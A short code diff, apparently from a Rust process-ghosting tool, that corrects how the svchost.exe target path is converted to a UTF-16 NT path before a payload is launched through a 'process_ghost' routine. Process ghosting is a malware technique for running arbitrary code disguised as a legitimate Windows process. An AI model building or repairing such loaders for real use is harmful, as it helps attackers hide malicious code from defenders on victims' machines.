@@ -417,9 +417,15 @@ fn main() {
 
         let (buf_payload, size_payload) = read_payload(path_payload.to_string());
 
+        let nt_string = format!(
+            "\\??\\C:\\Windows\\System32\\svchost.exe",
+
+        );
+
+        let u16_string=U16String::from_str(&nt_string);
         RtlInitUnicodeString(
             &mut set_target,
-            "C:\\Windows\\System32\\svchost.exe".as_ptr() as *const u16,
+            u16_string.as_ptr(),
         );
 
      let result=   process_ghost(set_target, buf_payload, size_payload);
